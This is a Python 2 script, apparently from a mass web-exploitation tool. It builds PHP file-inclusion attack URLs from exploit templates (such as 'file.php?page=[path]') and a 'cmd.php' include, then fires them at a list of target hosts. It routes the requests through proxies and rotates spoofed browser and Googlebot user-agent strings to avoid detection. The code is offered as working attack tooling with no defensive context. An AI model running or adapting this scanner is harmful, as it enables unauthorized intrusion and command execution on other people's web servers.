import time, urllib2, random
import socket 

class Request():
    global headers
    headers=[[('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)')],
       [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')],
       [('User-agent', 'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)')],
       [("IE 7 Vista","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")],
       [("Googlebot 2.1","Googlebot/2.1 (http://www.google.com/bot.html)")],
       [("Opera 9 (final) WinXP","Opera/9.00 (Windows NT 5.1; U; en)")],
       [("MSN Bot","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)")],
       [('User-agent', 'Mozilla/5.0 (compatible; MSIE 4.0; Windows NT)')],
       [('User-agent', 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)')],
       [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
       [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]

    def __init__(self, timer, target, proxy, path, exploit, include):
        
        self.id = 0
        self.timer = timer
        """if isinstance(target,  list) is False:
            self.target = [target]
        else:"""
        self.target = target
        self.proxy = proxy
        self.directory = path
        """if isinstance(exploit,  list) is False:
            self.exploit = [exploit]
        else:"""
        self.exploit = exploit
        self.include = include
        self.flag= None
        self.stack=[]


    def starttiming(self):
        return time.time()

    def setinput(self):
        self.flag="input"

    def setsingle(self):
        self.flag="single"

    def setmass(self):
        self.flag="mass"
        
    def setglob(self):
        self.flag="glob"


    def ConstructUrl(self, target, exploit, directory, include):
       
        self.directory = directory
        self.include   = include
        if exploit.find('[path]') > 0:
            exploit=exploit.replace('[path]',self.include)
            return 'http://'+target+self.directory+exploit
        else: return None


    def wget(self, url):
        #proxy syntax => proxy:port
        #dfto=socket.getdefaulttimeout()
        socket.setdefaulttimeout(4)
        if self.proxy is None or self.proxy == '':
            opener = urllib2.build_opener()
        else:
            prox = "http://"+self.proxy
            proxies = urllib2.ProxyHandler({"http" : prox})
            opener = urllib2.build_opener(proxies)
        try:
            i = random.randrange(0,6,1)
            opener.addheaders = headers[i]
            urllib2.install_opener(opener)
            try:
                req = urllib2.Request(url)
                req.add_header('Referer', 'www.securynix.com')
                
                #print ("[++]"+url)
                f=urllib2.urlopen(url, timeout=4)
                if f is not None:
                    return  f.read()
                else:
                    return None
                
            except urllib2.httplib.BadStatusLine:
		 raise ("Error reading response")
            except IOError,e:
                return 1 
            except URLError,e:
                 return 2
            except HTTPError,e:
                 return 3            
            finally:
               pass 
               #socket.setdefaulttimeout(dfto)
        except Exception, e:
            #raise(e)
            pass

  
    def scan(self):
         """ E(0..target) --> E(0..exploit) """ 
         for target in self.target:
             for exploit in self.exploit:
                 url=self.ConstructUrl(target.strip(), exploit.strip(), self.directory, self.include)                 
                 if url:
                     self.stack.append(url)
                 

import scan
if __name__=='__main__':
    target=["www2.nativelabs.org","www3.nativelabs.org"]
    
    port = 80
    s=scan.ScanOne(target[0], port)
    result=s.GetResult()
    if result=="open":
        status="open"
    
    exploit=["admin/index.php?site.php=[path]","file.php?page=[path]"]
    phpinc="cmd.php"
    r1=Request(0, target, "", "/", exploit, phpinc)
    r1.scan()
    print r1.target, r1.exploit, r1.stack
    for url in r1.stack:
        print (r1.wget(url))

